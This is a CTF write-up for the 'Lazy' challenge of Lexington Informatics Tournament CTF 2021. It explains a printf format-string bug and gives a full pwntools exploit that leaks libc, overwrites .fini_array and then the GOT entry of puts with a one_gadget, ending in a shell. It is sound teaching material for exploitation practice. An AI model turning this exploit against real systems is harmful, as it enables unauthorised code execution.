# Lexington Informatics Tournament CTF 2021

## pwn/Lazy

> Rythm 
> 
> Perhaps printf can do more than just read from the stack. I was too lazy to find out though. There’s not even a reference to the flag anyway. Do you think you GOT this?
> 
> `nc lazy.litctf.live 1337`
>
> [lazy_pwn.zip](lazy_pwn.zip)


Tags: _pwn_ _x86-64_ _fini-array_ _dtors_ _format-string_ _got-overwrite_ _one-gadget_

## Summary

Format-string overwrite of `.fini_array` to get a second pass to then overwrite the GOT with a gadget.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No RELRO? It is always _fini\_array_ (a.k.a. _dtors_)


### Decompile with Ghidra

```c
undefined8 main(void)
{
  ssize_t sVar1;
  undefined4 local_208 [128];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Do you have any complaints about this lazily written problem?");
  sVar1 = read(0,local_208,0x79);
  local_208[(int)sVar1] = 0;
  puts("You said:");
  printf((char *)local_208);
  puts("Your criticism will be taken into consideration.");
  return 0;
}
```

`printf((char *)local_208)` is the vulnerability (no format-string).

Simple two-pass attack.  First, leak libc and overwrite `.fini_array` with `main` for a second pass, then overwrite `puts` with a _one\_gadget_.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./lazy')

if args.REMOTE:
    p = remote('lazy.lit-ctf-2021-2-codelab.kctf.cloud', 1337)
    libc = ELF('./libc-2.31.so')
    libc_start_main_offset = 234
    libc.symbols['gadget'] = [0xcbd1a,0xcbd1d,0xcbd20][1]
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_start_main_offset = 243
    libc.symbols['gadget'] = [0xe6c7e,0xe6c81,0xe6c84][1]
```

Standard pwntools header with some gadgets (google for _one\_gadget_) defined (locally and remotely the 2nd gadget worked).


```python
offset = 6
libcleak_offset = 71
```

Discovered offsets using `%xx$p` and GDB locally.

> If new to format-string exploits read [dead-canary](https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2020/dead-canary).

```python
payload  = b''
payload += b'%' + str(libcleak_offset).encode().rjust(2,b'0') + b'$018p'
payload += fmtstr_payload(offset+1,{binary.get_section_by_name('.fini_array').header.sh_addr:binary.sym.main},numbwritten=18)

log.info('len(payload): ' + str(len(payload)))
assert(len(payload) <= 0x79)
p.sendlineafter('problem?\n',payload)

p.recvline()
_ = p.recv(18)
libc.address = int(_,16) - libc.sym.__libc_start_main - libc_start_main_offset
log.info('libc.address: ' + hex(libc.address))
```

First pass, just leak and compute libc, then set `.fini_array` to `main` and on end we score a second pass.

```python
payload = fmtstr_payload(offset,{binary.got.puts:libc.sym.gadget})
log.info('len(payload): ' + str(len(payload)))
assert(len(payload) <= 0x79)
p.sendlineafter('problem?\n',payload)

null = payload.find(b'\x00')
p.recvuntil(payload[null-2:null])
p.interactive()
```

On second pass just replace `puts` in the GOT with our gadget; the `puts` after `printf` just before `return 0` will start a shell.


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/litctf2021/lazy_pwn/lazy'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to lazy.lit-ctf-2021-2-codelab.kctf.cloud on port 1337: Done
[*] '/pwd/datajerk/litctf2021/lazy_pwn/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] len(payload): 72
[*] libc.address: 0x7f6b766aa000
[*] len(payload): 112
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 2000
-rw-r--r-- 1 nobody nogroup      39 Jul  2 06:05 flag.txt
-rwxr-xr-x 1 nobody nogroup   17592 Jul 16 12:25 lazy
-rwxr-xr-x 1 nobody nogroup  177928 Jul  1 17:34 ld-2.31.so
-rwxr-xr-x 1 nobody nogroup 1839792 Jul  1 17:34 libc-2.31.so
$ cat flag.txt
flag{1t_41nt_much_but_1ts_h0n3st_w0rk}
```
